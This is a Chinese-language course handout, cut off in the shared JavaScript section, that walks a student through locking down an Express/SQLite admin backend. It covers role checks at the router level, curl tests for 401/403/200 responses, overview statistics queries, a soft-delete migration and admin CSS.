# 第 57 节课：后台页面结构——先把门锁上，再摆家具

> **这份文件是你（学员）一步一步照着做的手册。**
> 你要做出一个后台。但第一件事不是画表格，是**把门锁上**：让非管理员连页面都进不来，让非管理员连接口都调不通。
> 今天你会做出一个"空的总览页"，然后亲手验证它挡得住人。

**建议用时**：140 分钟
**你需要先完成**：第 56 节课（`auth-lab` 能跑，`attack:report` 13 项全绿）

---

# 第 0 步：今天做什么，不做什么（10 分钟）

## 0.1 一张图看清结构

**后台有三个页面，共用一个侧栏：**

```text
┌──────────┬──────────────────────────────┐
│          │  总览                         │
│  侧栏     │  ┌────────┐ ┌────────┐        │
│          │  │ 用户 12 │ │ 内容 34 │        │
│  总览     │  └────────┘ └────────┘        │
│  用户     │                              │
│  日志     │  最近操作                     │
│          │  · alice 修改了用户 bob       │
│          │  · ...                        │
│  ─────    │                              │
│  返回前台  │                              │
│  登出     │                              │
└──────────┴──────────────────────────────┘
```

**注意侧栏只有三项（总览 / 用户 / 日志），但总览页有"内容总数"这张卡片。**

**卡片的数字来自数据库的 `items` 表（第 53 节已建），不需要"内容"页面存在。**

**这就是数据和页面的区别 —— 统计数字查库就行，做页面才需要 HTML。**

**今天只做三件事：**

```text
① 把侧栏布局做出来（HTML + CSS）
② 把"进门检查"做出来（非管理员直接踢出去）
③ 把总览页的数字接口做出来（先做最简单的两个数字）
```

**今天不做：列表、搜索、分页、增删改。** 那是第 58—61 节的活。

## 0.2 为什么"门锁"必须第一天就做

**因为后台是最容易被漏掉的地方。**

**真实案例的逻辑链：**

```text
① 你写了一个后台页面 /admin/users.html
② 页面里用 fetch 调 /api/admin/users
③ 你在页面里写了"如果非管理员就跳走"
④ 但 /api/admin/users 这个接口忘了加 requireRole
⑤ 攻击者打开 F12，或者在终端 curl 一下
⑥ 全部用户数据（含邮箱）被拿走
```

**第 ③ 步给了你"安全"的错觉。第 ④ 步才是真漏洞。**

**所以今天的顺序是：**

```text
先做接口的锁 → 再做页面的锁 → 最后做界面
```

**这个顺序以后每一次都一样：先服务端，再客户端。**

## 0.3 今天的交付物

| 文件 | 位置（都在 `auth-lab` 里） | 内容 |
|---|---|---|
| `TASK.md` | `01-任务` | 你正在读的这份 |
| `NOTES.md` | `02-笔记` | 你的记录 |
| `public/admin.css` | `public/` | 后台样式（一份，全站共用） |
| `public/admin.js` | `public/` | 前台公共函数（请求 + 格式化 + 守卫） |
| `public/admin/index.html` | `public/admin/` | 总览页 |
| `src/admin.js` | `src/` | 统计查询 |
| `src/admin-routes.js` | `src/` | 后台接口 |
| `src/app.js` | `src/` | 改：挂上 admin 路由 |

---

# 第 1 步：先确认第 8 周的东西还能跑（20 分钟）

## 1.1 开终端，进项目目录

**这一步最容易错：进错目录。**

**正确的路径（完整抄下来）：**

```text
B:\OPC-Distance_study\每周课程\02-AI应用骨架\第08周-账号与防刷\第01节课\03-练习代码\auth-lab
```

**怎么进去（三种方法，选一种）：**

**方法一：在 VS Code 里**

1. 左侧文件树，找到 `第08周-账号与防刷` → `第01节课` → `03-练习代码` → `auth-lab`
2. 右键 `auth-lab` → "在集成终端中打开"

**方法二：用资源管理器**

1. 打开 `auth-lab` 文件夹
2. 在地址栏里，把路径全部选中，输入 `cmd`，回车
3. 弹出黑窗口，路径已经是 `auth-lab`

**方法三：终端里 cd**

```text
cd /b/OPC-Distance_study/每周课程/02-AI应用骨架/第08周-账号与防刷/第01节课/03-练习代码/auth-lab
```

**进去之后，验证一下：**

```text
dir
```

**Windows 上应该看到：**

```text
data
node_modules
public
src
attacks
results
package.json
.env
...
```

**Linux/Mac/Git Bash 用 `ls`。**

**如果看到的是 `第08周-账号与防刷`，说明你没进去，再 cd 一次。**

## 1.2 三大确认

**确认一：依赖在不在**

```text
dir node_modules
```

**如果能列出 `express`、`bcryptjs` 等，说明装好了。**

**如果报"找不到文件"，跑：**

```text
npm install
```

**确认二：数据库在不在**

```text
dir data
```

**应该看到 `app.db`、`app.db-wal`、`app.db-shm`。**

**如果 `data` 是空的，跑：**

```text
npm run db:seed
```

**确认三：服务能启动**

```text
npm run dev
```

**应该看到：**

```text
[db] 已应用迁移 007_create_idempotency
auth-lab 已启动：http://localhost:4030
```

**注意：迁移号可能是 005、006、007，取决于你做到哪一步。重点是"已启动"。**

**看到"已启动"就说明第 8 周的东西还活着。**

## 1.3 三个终端怎么摆

**接下来你要同时用三个终端，先说清楚：**

```text
终端 A：服务（npm run dev）         —— 一直开着，能看到日志
终端 B：命令（curl 测试）           —— 用来手工测接口
终端 C：浏览器（http://localhost:4030）—— 看页面
```

**终端 A 不能关。** 关了服务就停了。

**在 VS Code 里开多个终端：**

```text
终端面板右上角有个 "+" 号，点它可以再开一个
```

**每个终端的路径要自己确认（新开的终端可能不在 auth-lab 里）。**

## 1.4 用浏览器确认登录链路

**打开：**

```text
http://localhost:4030/login.html
```

**用第 8 周的测试账号：**

```text
邮箱：alice@example.com
密码：test1234
```

**注意：密码可能被改过（第 51 节你测重置密码时可能改过）。**

**如果登不上：**

```text
方法一：用 bob@example.com / test1234 试
方法二：重新造数据（下面有）
```

**重新造数据的完整步骤（会丢原有数据，确认你能接受）：**

```text
① Ctrl + C 停掉终端 A 的服务
② npm run db:reset
③ npm run db:seed
④ npm run dev 重新启动
```

**`db:reset` 会删掉 `app.db`、`app.db-wal`、`app.db-shm` 三个文件。这是第 50 节写的脚本。**

**如果 `npm run db:reset` 报错说脚本不存在，说明你第 50 节没写 `src/reset.js`。手动删也行：**

```text
del data\app.db
del data\app.db-wal
del data\app.db-shm
```

**（`-wal` 和 `-shm` 可能不存在，报"找不到文件"没关系。）**

## 1.5 顺便把 Alice 变成管理员

**后台需要管理员才能进。所以现在要把 Alice 提升为 `admin`。**

**第 8 周第 53 节给过这条命令，再跑一次：**

```text
node --env-file=.env -e "import('./src/db.js').then(m => { const r = m.db.prepare('UPDATE users SET role=? WHERE email=?').run('admin','alice@example.com'); console.log('改了', r.changes, '行'); })"
```

**应该看到：**

```text
改了 1 行
```

**如果是 `0 行`，说明 `alice@example.com` 不存在。回去跑 `db:seed`。**

**验证一下：**

```text
node --env-file=.env -e "import('./src/db.js').then(m => console.table(m.db.prepare('SELECT id,email,role,status FROM users').all()))"
```

**应该看到 Alice 的 `role` 是 `admin`。**

**注意一个细节：** Alice 现在浏览器里的 token 是登录时签发的，里面 `role` 还是 `user`。

**但第 52 节的 `requireAuth` 是从数据库读 `role` 的，所以不用重新登录也会生效。**

**这正是第 53 节讲的"角色要查数据库，不能只信 JWT"。今天你会用到这个特性。**

---

# 第 2 步：先做接口的锁（30 分钟）

## 2.1 新建 `src/admin.js`（数据查询层）

**先建文件，把查询逻辑放这里，不要塞进 `admin-routes.js`。**

**为什么分开：**

```text
admin.js      只管"怎么查数据"（SQL）
admin-routes.js 只管"怎么处理请求"（HTTP）
```

**分开后，你的 SQL 能被复用（总览页和用户列表都要 `COUNT(*)`），也能被单独测试。**

**新建 `src/admin.js`，自己敲：**

```javascript
import { db } from "./db.js";

/**
 * 总览页要的统计数字。
 * 所有查询都排除软删除的数据。
 */
export const getOverview = () => {
  const users = db
    .prepare("SELECT COUNT(*) AS total FROM users WHERE deleted_at IS NULL")
    .get();

  const admins = db
    .prepare("SELECT COUNT(*) AS total FROM users WHERE role = 'admin' AND deleted_at IS NULL")
    .get();

  const newUsersToday = db
    .prepare(
      `SELECT COUNT(*) AS total FROM users
       WHERE deleted_at IS NULL AND created_at >= ?`
    )
    .get(startOfTodayLocal());

  const items = db
    .prepare("SELECT COUNT(*) AS total FROM items WHERE deleted_at IS NULL")
    .get();

  const publicItems = db
    .prepare(
      `SELECT COUNT(*) AS total FROM items
       WHERE deleted_at IS NULL AND visibility = 'public'`
    )
    .get();

  return {
    users: {
      total: Number(users.total),
      admins: Number(admins.total),
      newToday: Number(newUsersToday.total),
    },
    items: {
      total: Number(items.total),
      public: Number(publicItems.total),
    },
  };
};

/**
 * "今天 0 点"的本地时间字符串。
 * 注意：数据库里存的是 UTC ISO 串，这里要转成本地时间再比。
 */
const startOfTodayLocal = () => {
  const now = new Date();
  const local = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 0, 0, 0, 0);

  // 转成"本地时间以 UTC 形式表示"，再减 8 小时得到真正的 UTC 时刻
  const offsetMinutes = local.getTimezoneOffset();
  const utc = new Date(local.getTime() - offsetMinutes * 60 * 1000);

  return utc.toISOString();
};
```

## 2.2 三个必须看懂的地方

### 第一处：`WHERE deleted_at IS NULL`

**这条在每次查询都要加。**

**为什么：** 第 9 周开始用软删除（第 61 节会实现）。软删除的数据还在表里，但"不该被看到"。

**漏了会怎样：** 你删掉一个用户，但总览页的数字不减。客户会问"为什么删了还在"。

**现在的 `users` 表还没有 `deleted_at` 字段。** 所以这条 SQL 现在会报错：

```text
no such column: deleted_at
```

**解决：现在就把字段加上（下面第 2.3 步）。**

### 第二处：`startOfTodayLocal()` 为什么要绕一圈

**数据库里 `created_at` 存的是 `new Date().toISOString()`，是 UTC。**

```text
北京时间 2026-11-16 09:00  →  存成 "2026-11-16T01:00:00.000Z"
```

**你想算"今天新增"，指的是"北京时间今天 0 点之后"。**

```text
北京时间 2026-11-16 00:00 = UTC 2026-11-15 16:00
```

**所以 `startOfTodayLocal()` 要产出 `"2026-11-15T16:00:00.000Z"`。**

**逐步拆解那段代码：**

```javascript
const now = new Date();                                    // 现在（含时区信息）
const local = new Date(2026, 10, 16, 0, 0, 0, 0);          // 本地时间的 11-16 00:00（月份是 0-11，所以 10 = 11 月）
const offsetMinutes = local.getTimezoneOffset();           // 东八区返回 -480
const utc = new Date(local.getTime() - (-480) * 60000);    // 本地 00:00 + 8 小时 = UTC 16:00 前一天
```

**注意 `getTimezoneOffset()` 的符号是反的：**

```text
东八区（UTC+8）→ 返回 -480
西五区（UTC-5）→ 返回 +300
```

**所以 `local.getTime() - offsetMinutes * 60000` 这个减法是"减去负数 = 加"，正好把本地时间换算成 UTC。**

**这段逻辑第 44 节讲过原理，这里第一次真正用上。**

**如果你嫌复杂，有个笨办法：**

```javascript
const startOfTodayLocal = () => {
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, "0");
  const day = String(now.getDate()).padStart(2, "0");

  // 直接拼出"本地日期 + T00:00"，然后让 Date 解析
  return new Date(`${year}-${month}-${day}T00:00:00`).toISOString();
};
```

**`new Date("2026-11-16T00:00:00")` 不带 `Z` 时，JS 按**本地时间**解析。**

**所以这个写法更短，也更容易懂。用这个。**

**改掉：**

```javascript
const startOfTodayLocal = () => {
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, "0");
  const day = String(now.getDate()).padStart(2, "0");

  return new Date(`${year}-${month}-${day}T00:00:00`).toISOString();
};
```

### 第三处：`Number(x.total)`

**SQLite 的 `COUNT(*)` 在某些驱动下返回 BigInt，不是 Number。**

**`Number()` 包一层，`JSON.stringify` 才不会报：**

```text
TypeError: Do not know how to serialize a BigInt
```

**如果你看到这个错，就是这里漏了 `Number()`。**

## 2.3 加 `deleted_at` 字段（迁移 008）

**打开 `src/db.js`，找到 `migrations` 数组，在末尾加一项：**

```javascript
    {
      version: "008_add_soft_delete",
      sql: `
        ALTER TABLE users ADD COLUMN deleted_at TEXT;
        ALTER TABLE items ADD COLUMN deleted_at TEXT;

        DROP INDEX IF EXISTS idx_users_email;
        CREATE UNIQUE INDEX idx_users_email_active
          ON users(email) WHERE deleted_at IS NULL;

        CREATE INDEX idx_users_deleted ON users(deleted_at);
        CREATE INDEX idx_items_deleted ON items(deleted_at);
      `,
    },
```

**这段 SQL 在做四件事：**

| 语句 | 作用 |
|---|---|
| `ALTER TABLE ... ADD COLUMN deleted_at TEXT` | 加软删除标记字段，`NULL` 表示未删除 |
| `DROP INDEX IF EXISTS idx_users_email` | 删掉原来的唯一索引 |
| `CREATE UNIQUE INDEX ... WHERE deleted_at IS NULL` | **部分唯一索引**：只对"未删除"的行要求邮箱唯一 |
| `CREATE INDEX ... deleted_at` | 让"排除已删除"的查询走索引 |

### 为什么要换索引

**原来的索引是：**

```sql
CREATE INDEX idx_users_email ON users(email);
```

**等等，那个不是 UNIQUE 索引。真正的唯一性来自建表时的 `email TEXT NOT NULL UNIQUE`。**

**`UNIQUE` 是列约束，它在内部建了一个自动索引（名字是 `sqlite_autoindex_users_1`）。**

**问题：这个自动索引没法删，也没法加 `WHERE` 条件。**

**所以软删除后，`alice@example.com` 仍然占着唯一性，她无法重新注册。**

**解法：重建表。**

**这有点麻烦，但这是 SQLite 的限制。换个思路 —— 更简单的方案：**

**方案 B（简单，这一周用这个）：** 软删除时改邮箱。

```javascript
// 删除时
UPDATE users SET deleted_at = ?, email = email || '.deleted.' || ? WHERE id = ?
```

**好处：不需要改表结构，不用重建索引。**

**坏处：数据被改动了，恢复时要切回来。**

**如果你要干净的部分索引方案，需要在迁移里重建表：**

```sql
-- 完整重建（SQLite 改表结构的标准做法）
CREATE TABLE users_new (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT NOT NULL,          -- 注意：去掉了 UNIQUE
  password_hash TEXT NOT NULL,
  nickname TEXT,
  role TEXT NOT NULL DEFAULT 'user',
  status TEXT NOT NULL DEFAULT 'active',
  token_version INTEGER NOT NULL DEFAULT 1,
  created_at TEXT NOT NULL,
  updated_at TEXT NOT NULL,
  deleted_at TEXT
);
INSERT INTO users_new SELECT id,email,password_hash,nickname,role,status,
  COALESCE(token_version,1),created_at,updated_at,NULL FROM users;
DROP TABLE users;
ALTER TABLE users_new RENAME TO users;
CREATE UNIQUE INDEX idx_users_email_active ON users(email) WHERE deleted_at IS NULL;
```

**这一周选更简单的路：迁移只加字段，删除时改邮箱。**

**所以迁移 008 简化成：**

```javascript
    {
      version: "008_add_soft_delete",
      sql: `
        ALTER TABLE users ADD COLUMN deleted_at TEXT;
        ALTER TABLE items ADD COLUMN deleted_at TEXT;
        CREATE INDEX idx_users_deleted ON users(deleted_at);
        CREATE INDEX idx_items_deleted ON items(deleted_at);
      `,
    },
```

**然后第 61 节删除时这么写：**

```javascript
db.prepare(
  "UPDATE users SET deleted_at = ?, status = 'deleted', email = ? WHERE id = ?"
).run(now, `${user.email}.deleted.${Date.now()}`, userId);
```

**这样邮箱就腾出来了，可以重新注册。**

**记得在第 61 节的笔记里写下这个取舍。** 这是真实项目里要做决定的地方。

## 2.4 新建 `src/admin-routes.js`

**这是今天的重点。每个接口都要两道锁。**

```javascript
import express from "express";
import { requireAuth, requireRole } from "./auth.js";
import { getOverview } from "./admin.js";

export const adminRouter = express.Router();

// 关键：路由级别统一挂两道锁，而不是每个接口各挂一遍
adminRouter.use(requireAuth);
adminRouter.use(requireRole("admin"));

adminRouter.get("/overview", (req, res) => {
  const data = getOverview();
  res.json(data);
});

adminRouter.get("/ping", (req, res) => {
  res.json({
    ok: true,
    operator: { id: req.user.id, email: req.user.email, role: req.user.role },
    serverTime: new Date().toISOString(),
  });
});
```

## 2.5 为什么用 `adminRouter.use()` 统一挂，而不是每个接口挂

**两种写法对比：**

```javascript
// 写法 A：每个接口挂（容易漏）
adminRouter.get("/overview", requireAuth, requireRole("admin"), handler);
adminRouter.get("/users", requireAuth, requireRole("admin"), handler);
adminRouter.patch("/users/:id", requireAuth, requireRole("admin"), handler);   // ← 第 20 个接口忘了挂
```

```javascript
// 写法 B：路由级统一挂（漏不了）
adminRouter.use(requireAuth);
adminRouter.use(requireRole("admin"));
adminRouter.get("/overview", handler);
adminRouter.get("/users", handler);
adminRouter.patch("/users/:id", handler);   // ← 自动有锁
```

**为什么 B 更好：**

```text
① 漏不了 —— 新加接口自动带锁
② 改一处生效 —— 以后要加"二次验证"，只改一行
③ 一眼能看出"这个前缀下的接口都要管理员"
```

**这叫"安全默认值"（secure by default）。**

**和"每个接口各挂一遍"比，B 的漏掉概率是 0，A 不是。**

## 2.6 挂进 `src/app.js`

**找到 `app.js`，在文件顶部加 import：**

```javascript
import { adminRouter } from "./admin-routes.js";
```

**然后在 `app.listen` 之前，加一行：**

```javascript
app.use("/api/admin", adminRouter);
```

**位置很重要：必须在 `app.listen` 之前，也必须在 404 处理（如果有）之前。**

**完整的位置示例：**

```javascript
// ... 前面所有的 app.post("/api/register") 等 ...

app.use("/api/admin", adminRouter);        // ← 加在这里

// 错误处理必须在最后
app.use((error, req, res, next) => {
  // ...
});

app.listen(CONFIG.port, () => {
  console.log(`auth-lab 已启动：http://localhost:${CONFIG.port}`);
});
```

## 2.7 重启并测试

**终端 A 里 `Ctrl + C` 停掉，然后：**

```text
npm run dev
```

**应该看到新的迁移执行：**

```text
[db] 已应用迁移 008_add_soft_delete
auth-lab 已启动：http://localhost:4030
```

### 测试一：不带 Cookie 请求

**终端 B：**

```text
curl.exe -i http://localhost:4030/api/admin/overview
```

**`-i` 是"显示响应头"，方便看状态码。**

**应该看到：**

```text
HTTP/1.1 401 Unauthorized
...
{"error":"请先登录","code":"NO_TOKEN"}
```

**401 = 你没登录。锁生效了。**

### 测试二：用普通用户的 Cookie 请求

**先登录 Bob，把 Cookie 记下来。**

**手动拖 Cookie 很麻烦。用这一行（PowerShell / Git Bash 都行）：**

```text
curl.exe -i -X POST http://localhost:4030/api/login -H "Content-Type: application/json" -d "{\"email\":\"bob@example.com\",\"password\":\"test1234\"}"
```

**看响应头里有没有：**

```text
Set-Cookie: auth_token=eyJ...
```

**把 `auth_token=` 后面那一串复制出来（到第一个 `;` 为止）。**

**然后：**

```text
curl.exe -i http://localhost:4030/api/admin/overview -H "Cookie: auth_token=粘贴刚才的token"
```

**应该看到：**

```text
HTTP/1.1 403 Forbidden
{"error":"权限不足","code":"FORBIDDEN"}
```

**403 = 你登录了，但不是管理员。锁生效了。**

### 测试三：用 Alice 的 Cookie 请求

**同样的方法拿 Alice 的 token，然后：**

```text
curl.exe -i http://localhost:4030/api/admin/overview -H "Cookie: auth_token=Alice的token"
```

**应该看到：**

```text
HTTP/1.1 200 OK
{"users":{"total":2,"admins":1,"newToday":0},"items":{"total":4,"public":2}}
```

**三个状态码集齐了：401 / 403 / 200。**

**这就是今天最重要的成果。**

## 2.8 三个状态码要记住

| 状态码 | 意思 | 触发条件 |
|---|---|---|
| **401** | 你没登录 | 没有 Cookie / token 过期 / token 无效 |
| **403** | 你登录了，但没权限 | 角色不是 admin |
| **200** | 正常 | 都过了 |

**为什么不能都用 401：**

```text
401 会让前端去跳登录页
如果管理员权限不足也返回 401，非管理员会被踢到登录页
他会以为"我的账号坏了"，反复登录
```

**403 才能让前端显示"你没有权限"，而不是"请登录"。**

**这个区别第 53 节讲过，今天在真实页面上会看到它的价值。**

---

# 第 3 步：写后台样式（35 分钟）

## 3.1 新建 `public/admin.css`

**先说明：这份 CSS 你会复制到每个后台页面。所以它要"自包含"。**

**自己敲（一次敲完，不要跳）：**

```css
/* 后台通用样式。三个页面共用。 */

* {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  padding: 0;
  height: 100%;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Microsoft YaHei", sans-serif;
  font-size: 14px;
  color: #1a1d23;
  background: #f6f7f9;
  -webkit-font-smoothing: antialiased;
}

/* ============ 布局 ============ */

.layout {
  display: flex;
  min-height: 100vh;
}

.sidebar {
  width: 200px;
  flex: 0 0 200px;
  background: #1f2430;
  color: #c9d1de;
  display: flex;
  flex-direction: column;
  padding: 18px 0;
}

.sidebar .brand {
  padding: 0 20px 18px;
  font-size: 15px;
  font-weight: 600;
  color: #fff;
  letter-spacing: 0.3px;
}

.sidebar .brand small {
  display: block;
  font-size: 11px;
  font-weight: 400;
  color: #7b8496;
  margin-top: 3px;
}

.nav {
  flex: 1;
  display: flex;
  flex-direction: column;
  gap: 2px;
  padding: 0 10px;
}

.nav a {
  display: block;
  padding: 9px 12px;
  border-radius: 7px;
  color: #c9d1de;
  text-decoration: none;
  font-size: 13.5px;
  transition: background 0.12s;
}

.nav a:hover {
  background: #2b3242;
  color: #fff;
}

.nav a.active {
  background: #1a6dff;
  color: #fff;
  font-weight: 500;
}

.nav .divider {
  height: 1px;
  background: #2b3242;
  margin: 10px 6px;
}

.sidebar .foot {
  padding: 14px 20px 0;
  border-top: 1px solid #2b3242;
  font-size: 12px;
  color: #7b8496;
}

.sidebar .foot .who {
  color: #c9d1de;
  margin-bottom: 8px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.sidebar .foot button {
  width: 100%;
  padding: 7px;
  font: inherit;
  font-size: 12px;
  border: 1px solid #3b4356;
  background: transparent;
  color: #c9d1de;
  border-radius: 6px;
  cursor: pointer;
}

.sidebar .foot button:hover {
  background: #2b3242;
  color: #fff;
}

.main {
  flex: 1;
  min-width: 0;
  padding: 26px 30px 60px;
}

.page-head {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  margin-bottom: 20px;
  gap: 16px;
}

.page-head h1 {
  font-size: 20px;
  font-weight: 600;
  margin: 0;
}

.page-head .sub {
  font-size: 12.5px;
  color: #6b7280;
  margin-top: 5px;
}

/* ============ 卡片 ============ */

.cards {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
  gap: 14px;
  margin-bottom: 22px;
}

.card {
  background: #fff;
  border: 1px solid #e6e8ec;
  border-radius: 10px;
  padding: 16px 18px;
}

.card .label {
  font-size: 12px;
  color: #6b7280;
}

.card .value {
  font-size: 26px;
  font-weight: 600;
  margin-top: 8px;
  font-variant-numeric: tabular-nums;
  line-height: 1.1;
}

.card .sub {
  font-size: 11.5px;
  color: #9ca3af;
  margin-top: 6px;
}

.panel {
  background: #fff;
  border: 1px solid #e6e8ec;
  border-radius: 10px;
  overflow: hidden;
  margin-bottom: 18px;
}

.panel-head {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 14px 18px;
  border-bottom: 1px solid #eef0f3;
  gap: 12px;
}

.panel-head h2 {
  font-size: 14px;
  font-weight: 600;
  margin: 0;
}

.panel-body {
  padding: 18px;
}

/* ============ 表格 ============ */

.table-wrap {
  overflow-x: auto;
}

table {
  width: 100%;
  border-collapse: collapse;
  font-size: 13px;
}

thead th {
  text-align: left;
  padding: 10px 14px;
  background: #fafbfc;
  color: #6b7280;
  font-weight: 500;
  font-size: 12px;
  border-bottom: 1px solid #eef0f3;
  white-space: nowrap;
}

tbody td {
  padding: 11px 14px;
  border-bottom: 1px solid #f3f4f6;
  vertical-align: middle;
}

tbody tr:last-child td {
  border-bottom: none;
}

tbody tr:hover {
  background: #fafbfc;
}

td.num,
th.num {
  text-align: right;
  font-variant-numeric: tabular-nums;
}

td.actions {
  text-align: right;
  white-space: nowrap;
}

td.empty {
  padding: 40px 20px;
  text-align: center;
  color: #9ca3af;
  font-size: 13px;
}

/* ============ 按钮 ============ */

button,
.btn {
  font: inherit;
  font-size: 13px;
  padding: 7px 14px;
  border-radius: 7px;
  border: 1px solid #d7dae0;
  background: #fff;
  color: #1a1d23;
  cursor: pointer;
  text-decoration: none;
  display: inline-block;
  line-height: 1.4;
}

button:hover,
.btn:hover {
  background: #f5f6f8;
}

button.primary,
.btn.primary {
  background: #1a6dff;
  border-color: #1a6dff;
  color: #fff;
}

button.primary:hover,
.btn.primary:hover {
  background: #1359d8;
}

button.danger {
  color: #b91c1c;
  border-color: #f2c4c4;
}

button.danger:hover {
  background: #fdf2f2;
}

button.small {
  padding: 4px 10px;
  font-size: 12px;
}

button:disabled {
  opacity: 0.55;
  cursor: not-allowed;
}

/* ============ 表单 ============ */

.field {
  margin-bottom: 14px;
}

.field label {
  display: block;
  font-size: 12.5px;
  color: #4b5563;
  margin-bottom: 6px;
}

.field input,
.field select,
.field textarea {
  width: 100%;
  padding: 8px 11px;
  font: inherit;
  font-size: 13.5px;
  border: 1px solid #d7dae0;
  border-radius: 7px;
  background: #fff;
}

.field input:focus,
.field select:focus,
.field textarea:focus {
  outline: 2px solid #cfe0ff;
  border-color: #1a6dff;
}

.field .hint {
  font-size: 11.5px;
  color: #9ca3af;
  margin-top: 5px;
}

.field .err {
  font-size: 11.5px;
  color: #b91c1c;
  margin-top: 5px;
  display: none;
}

.field.invalid input,
.field.invalid select {
  border-color: #dc6a6a;
}

.field.invalid .err {
  display: block;
}

/* ============ 提示条 ============ */

.alert {
  padding: 11px 14px;
  border-radius: 8px;
  font-size: 13px;
  margin-bottom: 16px;
  display: none;
}

.alert.show {
  display: block;
}

.alert.error {
  background: #fdf2f2;
  border: 1px solid #f5d3d3;
  color: #9c2b2b;
}

.alert.ok {
  background: #f1f9f3;
  border: 1px solid #cde9d5;
  color: #1f6b3a;
}

.alert.warn {
  background: #fdf8ec;
  border: 1px solid #f3e3bb;
  color: #8a5a0b;
}

/* ============ 状态标签 ============ */

.tag {
  display: inline-block;
  padding: 2px 8px;
  border-radius: 5px;
  font-size: 11.5px;
  line-height: 1.6;
  white-space: nowrap;
}

.tag.gray {
  background: #f0f1f4;
  color: #5b6270;
}

.tag.blue {
  background: #eaf2ff;
  color: #1a5ad8;
}

.tag.green {
  background: #ebf7ef;
  color: #1f6b3a;
}

.tag.red {
  background: #fdeeee;
  color: #a52c2c;
}

.tag.amber {
  background: #fdf6e7;
  color: #8a5a0b;
}

/* ============ 加载与骨架 ============ */

.skeleton {
  background: linear-gradient(90deg, #f0f1f4 25%, #e6e8ec 37%, #f0f1f4 63%);
  background-size: 400% 100%;
  animation: shimmer 1.3s ease-in-out infinite;
  border-radius: 5px;
  height: 13px;
}

@keyframes shimmer {
  0% {
    background-position: 100% 50%;
  }
  100% {
    background-position: 0 50%;
  }
}

.spinner {
  display: inline-block;
  width: 14px;
  height: 14px;
  border: 2px solid #d7dae0;
  border-top-color: #1a6dff;
  border-radius: 50%;
  animation: spin 0.7s linear infinite;
  vertical-align: -2px;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.center-box {
  padding: 60px 20px;
  text-align: center;
  color: #6b7280;
}

/* ============ 弹窗 ============ */

.modal-mask {
  position: fixed;
  inset: 0;
  background: rgba(20, 24, 33, 0.45);
  display: none;
  align-items: center;
  justify-content: center;
  padding: 20px;
  z-index: 100;
}

.modal-mask.show {
  display: flex;
}

.modal {
  background: #fff;
  border-radius: 12px;
  width: 100%;
  max-width: 440px;
  max-height: 90vh;
  overflow: auto;
  box-shadow: 0 12px 40px rgba(0, 0, 0, 0.18);
}

.modal-head {
  padding: 18px 20px 14px;
  border-bottom: 1px solid #eef0f3;
  font-size: 15px;
  font-weight: 600;
}

.modal-body {
  padding: 18px 20px;
}

.modal-foot {
  padding: 14px 20px 18px;
  display: flex;
  justify-content: flex-end;
  gap: 10px;
}

/* ============ 移动端 ============ */

@media (max-width: 720px) {
  .layout {
    flex-direction: column;
  }

  .sidebar {
    width: 100%;
    flex: 0 0 auto;
    flex-direction: row;
    align-items: center;
    padding: 10px 12px;
    overflow-x: auto;
  }

  .sidebar .brand {
    padding: 0 14px 0 4px;
    white-space: nowrap;
  }

  .sidebar .brand small {
    display: none;
  }

  .nav {
    flex-direction: row;
    padding: 0;
    gap: 4px;
  }

  .nav .divider {
    display: none;
  }

  .nav a {
    white-space: nowrap;
    padding: 7px 10px;
  }

  .sidebar .foot {
    display: none;
  }

  .main {
    padding: 18px 14px 40px;
  }
}
```

## 3.2 这份 CSS 的五个设计点

### 第一点：`.sidebar` 定宽 + `.main` 弹性

```css
.sidebar {
  width: 200px;
  flex: 0 0 200px;    /* 不放大、不缩小、固定 200 */
}
.main {
  flex: 1;
  min-width: 0;       /* 关键 */
}
```

**`min-width: 0` 是必须的。**

**为什么：** flex 子项的默认 `min-width` 是 `auto`，意思是"不能小于内容的固有宽度"。

**表格很宽时，`.main` 会被撑开，整个页面出现横向滚动条。**

**加 `min-width: 0` 后，`.main` 允许被压缩，表格自己在容器内滚动（`.table-wrap { overflow-x: auto }`）。**

**这是 flex 布局最经典的坑，几乎每个人都会踩。**

### 第二点：`font-variant-numeric: tabular-nums`

**让数字宽度一致。**

```text
不用：1,234     （1 窄）
      9,999     （9 宽，和上面不对齐）

用：  1,234
      9,999     （对齐）
```

**表格里的数字必须对齐，否则看起来像没排版。**

### 第三点：移动端改成横向侧栏

```css
@media (max-width: 720px) {
  .layout { flex-direction: column; }
  .sidebar { flex-direction: row; overflow-x: auto; }
}
```

**为什么不做"汉堡菜单"：**

**后台的使用者多数在电脑上。手机访问是极端情况，只要"能用"就行，不需要做抽屉动画。**

**这一条是"知道什么时候不做"。**

### 第四点：`.skeleton` 骨架屏

**加载时不显示"转圈"，而是显示灰条。**

**为什么：**

```text
转圈 → 用户不知道要等多久，也不知道会出来什么
骨架 → 用户看到"这里会有一个表格"，心理预期明确
```

**体验上骨架屏明显更好。** 代码只有 8 行。

### 第五点：`.tag` 状态标签

**五种颜色对应五种状态。**

**为什么不用图标库：**

**纯色小块 + 文字，够用，0 依赖。**

---

# 第 4 步：写公共 JS（25 分钟）

## 4.1 新建 `public/admin.js`

**这份文件被三个页面共用。它做四件事：**

```text
① 统一的请求封装（带 Cookie、处理 401/403）
② 格式化函数（时间、数字、转义）
③ 侧栏渲染
④ 门卫：非管理员直接踢出去
```

**自己敲：**

```javascript
/* 后台公共脚本。三个页面共用。 */

// ============ 1. 请求封装 ============

/**
 * 统一的 fetch 封装。
 * - 自动带 Cookie
 * - 401 自动跳登录
 * - 403 提示没权限
 * - 返回 { ok, status, data }
 */
export const api = async (path, options = {}) => {
  const response = await fetch(path, {
    ...options,
    credentials: "same-origin",
    headers: {
      "Content-Type": "application/json",
      ...(options.headers || {}),
    },
  });

  // 401：没登录 / 过期 → 跳登录页
  if (response.status === 401) {
    const next = encodeURIComponent(window.location.pathname + window.location.search);
    window.location.href = `/login.html?next=${next}`;
    return { ok: false, status: 401, data: null };
  }

